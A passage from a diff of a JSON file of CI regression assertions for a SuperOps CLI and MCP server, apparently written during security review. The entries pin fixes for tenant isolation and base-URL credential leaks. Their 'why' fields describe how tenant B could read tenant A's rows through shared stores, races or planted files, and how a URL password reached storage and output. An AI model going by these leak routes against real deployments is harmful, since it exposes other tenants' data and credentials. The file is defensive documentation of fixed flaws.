+   "why": "The tenant is the CustomerSubDomain header plus the host; neither keyed the store or the checkpoint, so tenant B resumed tenant A's cursor and read A's rows, and an upgrade could adopt a store of unknown tenant. The scoped default path kept the default store apart, but the store file recorded no tenant, so any other route to a store mixed tenants: sync --db shared.db as acme-a then acme-b left A's rows under B (Codex P1), and with no credential superops-mcp sql read a planted data.db holding A's rows (adversarial P2). Review round 2 found the first record check was check-then-act: a read-only open of an empty unrecorded store returned without claiming it, so tenant B could claim and fill the file between tenant A's open and A's query (P1); the store re-read --config at open time apart from the read the client was built from, so a config edit between the two stamped the store for B while A's rows went in (P1); and the claim checked only the synced tables, so a pre-record file holding only A's learn rows was claimed by B's first read-write open and B's recall returned A's note (P2). CustomerSubDomain matched none of the generic tenant-selecting header rules, so one token at two subdomains shared cached GET bodies.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "StoreScopeIdentity",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/superops_tenant_scope.go",
+     "contains": "return map[string]string{config.SuperOpsTenantScopeVar: c.Config.SuperOpsTenant()}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_scope.go",
+     "contains": "func storeAdoptsPreTenantStores() bool",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "storeAdoptsPreTenantStores()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_store_adopt_test.go",
+     "contains": "func TestUpgradedStoreIsNeverAdopted(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_review_test.go",
+     "contains": "func TestSyncKeepsEachTenantApart(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "func (s *Store) enforceStoreTenant(ctx context.Context, writable bool) error",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "func (s *Store) claimTenant(ctx context.Context, tenant string) error",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if err := s.enforceStoreTenant(ctx, false); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if err := s.enforceStoreTenant(ctx, true); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_scope.go",
+     "contains": "store.SetTenantSource(storeTenantOfThisCommand)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "recordStoreTenantConfig(snapshot.configPath)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_novel.go",
+     "contains": "errors.Is(err, store.ErrStoreTenant)",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
+     "contains": "if superOpsTenantHeader(folded) {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
+     "file": "cli/internal/client/superops_tenant_scope.go",
+     "contains": "return folded == \"customersubdomain\"",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
+     "file": "cli/internal/cli/superops_tenant_stamp_test.go",
+     "contains": "func TestSharedDBIsNeverReadOrWrittenAsAnotherTenant(",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
+     "file": "cli/internal/cli/superops_tenant_stamp_test.go",
+     "contains": "func TestSyncRefusesAStoreStampedForAnotherTenant(",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
+     "file": "cli/internal/cli/superops_tenant_stamp_test.go",
+     "contains": "func TestUnprovenStoreIsNotReadWithoutACredential(",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
+     "file": "cli/internal/cli/superops_tenant_stamp_test.go",
+     "contains": "func TestFreshStoreSyncsAndReadsForItsOwnTenant(",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
+     "file": "cli/internal/cli/superops_tenant_stamp_test.go",
+     "contains": "func TestDefaultStoreKeepsWorkingForEachTenant(",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
+     "file": "cli/internal/cli/superops_tenant_stamp_test.go",
+     "contains": "func TestLearnCommandsWorkOnAFreshInstall(",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
+     "file": "cli/internal/mcp/superops_tenant_stamp_test.go",
+     "contains": "func TestMCPSQLAndSearchRefuseAStoreOfAnotherTenant(",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
+     "file": "cli/internal/mcp/superops_tenant_stamp_test.go",
+     "contains": "func TestMCPSQLAndSearchReachTheirOwnTenantsStore(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp_test.go",
+     "contains": "func TestTenantStampRefusesAnotherTenantOnEveryOpen(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp_test.go",
+     "contains": "func TestTenantStampRefusesAnUnprovenStoreWithData(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp_test.go",
+     "contains": "func TestTenantStampRaceHasOneOwner(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_cache_test.go",
+     "contains": "func TestResponseCacheIsNeverReadAsAnotherTenant(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/superops_tenant_cache_test.go",
+     "contains": "func TestResponseCacheKeyIsPerTenant(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "return &TenantRefusal{Path: s.path, Unclaimed: true}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "return &TenantRefusal{Path: s.path, UnknownTenant: true}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "if _, err := conn.ExecContext(ctx, `BEGIN IMMEDIATE`); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "holds, err := storeHoldsRows(ctx, conn)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "func storeHoldsRows(ctx context.Context, q tenantRowsQuerier) (bool, error)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "`SELECT name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite\\_%' ESCAPE '\\' AND name <> ?`, TenantStampTable)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "source := tenantSourceOf(ctx)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "func WithTenantSource(ctx context.Context, fn func() (tenant string, ok bool)) context.Context",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_scope.go",
+     "contains": "r.once.Do(func() { r.cfg, r.err = config.Load(r.configPath) })",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_scope.go",
+     "contains": "return store.WithTenantSource(ctx, r.tenant)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_scope.go",
+     "contains": "func MCPStoreRun(ctx context.Context) (context.Context, string, error)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_scope.go",
+     "contains": "return newRunSnapshot(path).tenant()",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
+     "contains": "snapshot *runSnapshot",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "cmd.SetContext(flags.beginRunSnapshot(cmd.Context()))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "configureDefaultDBScopeFrom(flags.runSnapshot())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "cfg, err := f.runSnapshot().config()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "store.OpenWithContext(flags.runSnapshot().detachedStoreContext(), learnDBPath(\"\"))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "configureDefaultDBScopeFrom(newRunSnapshot(configPath))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "cfg, err := snapshot.config()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "cfg, err := flags.runSnapshot().config()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_novel.go",
+     "contains": "st, err := store.OpenReadOnlyContext(ctx, path)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "db, err := store.OpenReadOnlyValueCapped(ctx, path, maxValueBytes)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_race_test.go",
+     "contains": "func TestTenantStampReadOnlyOpenRefusesAStoreThatRecordsNoTenant(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_race_test.go",
+     "contains": "func TestTenantStampClaimNeedsEveryTableEmpty(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_race_test.go",
+     "contains": "func TestTenantStampFirstOpensRaceToOneOwner(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_race_test.go",
+     "contains": "func TestTenantStampUnknownTenantNeverUsesAnUnclaimedStore(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp_test.go",
+     "contains": "func TestTenantStampClaimsAnEmptyStoreOnFirstReadWriteOpen(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_race_test.go",
+     "contains": "func TestUnclaimedSharedDBIsNeverReadBeforeAnotherTenantFillsIt(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_race_test.go",
+     "contains": "func TestStoreTenantIsTheTenantOfTheClientsConfig(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_race_test.go",
+     "contains": "func TestLearnOnlyStoreWithoutATenantIsNeverClaimed(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_race_test.go",
+     "contains": "func TestEveryShippedStoreOpenPassesAContext(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_race_test.go",
+     "contains": "func TestFreshInstallLocalCommandsKeepWorking(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_run_test.go",
+     "contains": "func TestRunSnapshotLoadsTheConfigOnce(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_run_test.go",
+     "contains": "func TestMCPStoreRunUsesOneSnapshot(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_run_test.go",
+     "contains": "func TestEachExecutionTakesItsOwnSnapshot(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/superops_tenant_race_test.go",
+     "contains": "func TestMCPSQLAndSearchRefuseAStoreThatRecordsNoTenant(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/superops_tenant_race_test.go",
+     "contains": "func TestMCPSQLAndSearchOnAFreshInstall(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "storeCtx, path, err := cli.MCPStoreRun(context.Background())",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "return store.Open(learnDBPath(\"\"))"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "db, err := store.OpenReadOnly(path)"
+    },
+    {
+     "file": "cli/internal/cli/superops_novel.go",
+     "not_contains": "st, err := store.OpenReadOnly(path)"
+    }
+   ]
+  },
+  {
+   "id": "superops-tenant-identity-no-credential",
+   "class": "credential-leak",
+   "summary": "config.SuperOpsTenant builds the tenant identity from the base URL's scheme, host, port and path only (net/url, through cliutil.URLWithoutUserinfo, the parse rule every display of a base URL shares (superops-base-url-never-printed); never userinfo, query or fragment; lowercased whole, as before, so https://api.superops.ai and https://euapi.superops.ai give the same identity as before). A base URL that does not parse or names no scheme and host gives base_url=invalid, never the raw text. So does one with an '@', in any percent encoding (%40, %2540), outside the userinfo the parser separates (cliutil.URLUserinfoDisplaced): a username or password with an unescaped '/', '?' or '#', or an escaped '@', is otherwise read as the host, port, path, query or fragment, which the identity keeps. The identity is the one source of the store tenant record, the sync checkpoint scope key and the default store path hash. The tenant record carries a version (2); a version 1 record (the whole base URL) of the running tenant is rewritten with every checkpoint scope key in one transaction by a read-write open (secure_delete on, then a TRUNCATE WAL checkpoint, so no old page survives), a read-only open refuses it (TenantRefusal.Unscrubbed) without printing it, and a version 1 record of another tenant is refused and left alone.",
+   "why": "The identity kept the raw base URL, lowercased, so SUPEROPS_BASE_URL=http://svc:PASSWORD@host wrote the password into superops_store_tenant on any read-write open (even learnings list) and into sync_state.scope_key after a sync, and the MCP sql tool read both back (adversarial round 2, P1). The client already treats URL userinfo as a credential. A reprint regenerates the generated store and client but not these hand files; this entry pins the sanitizing line, the version bump, the scrub and its tests so a merge that brings back the raw URL fails CI.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "return strings.ToLower(base)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "return u.Scheme + \"://\" + u.Host + strings.TrimRight(u.EscapedPath(), \"/\"), true",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "base, ok := cliutil.URLWithoutUserinfo(raw)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "u, err := url.Parse(strings.TrimSpace(raw))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "return superOpsTenantIdentity(c.Subdomain, c.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "func SuperOpsTenantFromRecord(record string) string",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "const tenantStampVersion = 2",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "version INTEGER NOT NULL DEFAULT 1",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "if stamp, err = s.retireLegacyTenantStamp(ctx, deadline, stamp, tenant, known, writable); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "func (s *Store) scrubLegacyTenantStamp(ctx context.Context, tenant string) (string, error)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "`UPDATE `+TenantStampTable+` SET tenant = ?, version = ? WHERE id = 1`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "`UPDATE sync_state SET scope_key = ? WHERE resource_type = ?`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "`PRAGMA secure_delete = ON`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "`PRAGMA wal_checkpoint(TRUNCATE)`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_stamp.go",
+     "contains": "return \"\", &TenantRefusal{Path: s.path, Unscrubbed: true}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_identity_test.go",
+     "contains": "func TestSuperOpsTenantNeverHoldsACredential(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_identity_test.go",
+     "contains": "func TestSuperOpsTenantOfAnInvalidBaseURLHoldsNoneOfIt(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_identity_test.go",
+     "contains": "func TestSuperOpsTenantUnchangedForOrdinaryHosts(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_identity_test.go",
+     "contains": "func TestStoreScopeIdentityHoldsNoURLCredential(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_identity_test.go",
+     "contains": "func TestTenantStampOfAUserinfoBaseURLHoldsNoPassword(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_identity_test.go",
+     "contains": "func TestTenantStampV1WithCredentialIsScrubbedOnReadWriteOpen(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_identity_test.go",
+     "contains": "func TestTenantStampV1WithCredentialIsRefusedOnReadOnlyOpen(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_identity_test.go",
+     "contains": "func TestTenantStampV1OfAnotherTenantIsRefusedAndNotScrubbed(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/superops_tenant_identity_test.go",
+     "contains": "func TestTenantStampV1WithoutCredentialKeepsWorking(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_identity_test.go",
+     "contains": "func TestUserinfoBaseURLIsNeverPersisted(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_identity_test.go",
+     "contains": "func TestBaseURLQueryAndFragmentAreNeverPersisted(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_identity_test.go",
+     "contains": "func TestLegacyStampWithUserinfoIsScrubbedByTheNextSync(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/superops_tenant_identity_test.go",
+     "contains": "func TestMCPSQLNeverReturnsTheBaseURLPassword(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/superops_tenant_identity_test.go",
+     "contains": "func TestMCPSQLRefusesALegacyStampHoldingTheURLPassword(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "if err != nil || u.Scheme == \"\" || u.Host == \"\" || URLUserinfoDisplaced(raw) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_identity_test.go",
+     "contains": "func TestSuperOpsTenantOfADisplacedUserinfoHoldsNoneOfIt(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "superops-base-url-never-printed",
+   "class": "credential-leak",
+   "summary": "A username or password in SUPEROPS_BASE_URL (URL userinfo, http://user:password@host) is never shown in any output: stdout, stderr, --json/--agent envelopes, doctor (human and JSON), --dry-run previews, retry notices, error messages, sync events, the jobs ledger, MCP tool results and MCP errors. One helper, cliutil.DisplayURL (internal/cliutil/url_redact.go), shows a URL as scheme://host[:port]/path through cliutil.URLWithoutUserinfo, the same parse rule the tenant identity uses: never the userinfo, the query or the fragment (nothing shows those are free of a credential); a URL that does not parse as scheme://host, or that parses with an '@' left in its path, query or fragment, shows as the fixed placeholder cliutil.URLWithheld. Routed through it: doctor base_url, the two untrusted-config refusals and the global-credential refusal (config.go), and the client's displayURL (dry-run and error prefixes). Backstop for text this program did not build (net/http's url.Error keeps the username; url.Parse errors quote the whole URL): cliutil.RedactURLUserinfo removes any URL's userinfo (plain, JSON \\/ and percent-encoded forms) in the client's maskCredentialText, at the CLI error chokepoints (funnelError, funnelShownError, which doctor's error fields now use too) and in the MCP funnelToolErrors middleware; and the userinfo parts (password at any length, username of 8+ characters, the pair, and the HTTP Basic header built from it) are registered as credentials: masked by maskCredentialText and held by the shared funnel (config.Load, client.New, and the MCP server at start), so FunnelHeld withholds any decoded echo. A transport error that lost only userinfo keeps its error chain (urlRedactedError), so timeouts and refused connections still classify; a request parse error is masked and does not unwrap. The jobs ledger records and shows wait errors without userinfo. The backstop for error text the program does not construct lives in superops-owned files (internal/cli/superops_url_redact_cli.go wrapped around every command after the shared funnel; cmd/superops-mcp/superops_url_redact_mcp.go registered inside funnelToolErrors), never in the canonical secret_funnel_*.go copies, which ship byte-identical fleet-wide. A base URL with an '@', in any percent encoding, outside the userinfo the parser separates (cliutil.URLUserinfoDisplaced: part of a username or password was read as host, port, path, query or fragment) shows as cliutil.URLWithheld, and config.Load refuses it, and a base URL with a query or fragment outside its userinfo (cliutil.URLHasQueryOrFragment: request paths are appended to the base URL, so neither can be part of a working one, and request errors quote the whole URL), in refuseUnshowableBaseURL after the env override and the tenant routing, with a message that holds none of it, so no request, preview or request error is ever built from it.",
+   "why": "The previous fix removed userinfo from what is STORED (the tenant identity); this one covers what is SHOWN. With SUPEROPS_BASE_URL=http://svc:PASSWORD@host, doctor printed base_url verbatim (human and --json), the untrusted-config and global-credential refusals printed it with %q on stderr, in doctor and auth status and as the command error, every --dry-run preview printed it in the request line, and every transport failure printed net/http's url.Error with the username (retry notices, command errors, sync events, MCP tool errors and the MCP server log); a base URL that does not parse printed the password too, and a 401 body echoing the Basic header showed the pair in base64. A reprint regenerates doctor.go, config.go, client.go and jobs.go, so this entry pins every routed call and bans the raw forms; the tests prove each output path both ways (the userinfo absent in plain, URL-escaped, base64, hex and JSON-escaped form, and the host still shown).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "func URLWithoutUserinfo(raw string) (string, bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "u, err := url.Parse(strings.TrimSpace(raw))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "return u.Scheme + \"://\" + u.Host + strings.TrimRight(u.EscapedPath(), \"/\"), true",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "func DisplayURL(raw string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "shown, ok := URLWithoutUserinfo(trimmed)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "return URLWithheld",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "if strings.Contains(u.EscapedPath()+\"?\"+u.RawQuery+\"#\"+u.EscapedFragment(), \"@\") {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "func RedactURLUserinfo(text string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "func nextURLSchemeMarker(low string, from int, markers []urlSchemeMarker) *urlSchemeMarker {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "func URLUserinfoSecrets(raw string) []string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "out = append(out, \"Basic \"+base64.StdEncoding.EncodeToString([]byte(decodedUser+\":\"+decodedPass)))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "func HoldURLUserinfo(raws ...string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "HoldValues(urlUserinfoIn(raw)...)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "base, ok := cliutil.URLWithoutUserinfo(raw)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "cliutil.HoldURLUserinfo(c.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cfg.holdBaseURLUserinfo()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cliutil.DisplayURL(cfg.BaseURL), cfg.Path),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cliutil.DisplayURL(c.BaseURL), configPath),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cliutil.DisplayURL(issued), cliutil.DisplayURL(target), c.Path)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "so they were not applied to %s; run auth login --config %s\", cliutil.DisplayURL(target), c.Path)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "not_contains": "or set SUPEROPS_BASE_URL)\", cfg.BaseURL, cfg.Path)"
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "not_contains": "or set SUPEROPS_BASE_URL)\", c.BaseURL, configPath)"
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "not_contains": "run auth login --config %s\", issued, target, c.Path)"
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "not_contains": "so they were not applied to %s; run auth login --config %s\", target, c.Path)"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return c.maskCredentialText(cliutil.DisplayURL(rawURL), extraCredentials...)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "masked = cliutil.RedactURLUserinfo(masked)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "for _, value := range c.baseURLUserinfoSecrets() {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if kept := urlUserinfoOnlyMasked(err, raw, msg); kept != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return nil, 0, fmt.Errorf(\"creating request: %s\", c.maskCredentialText(err.Error(), authHeader))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "return nil, 0, fmt.Errorf(\"creating request: %w\", err)"
+    },
+    {
+     "file": "cli/internal/client/superops_url_redact.go",
+     "contains": "out := cliutil.URLUserinfoSecrets(c.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/superops_url_redact.go",
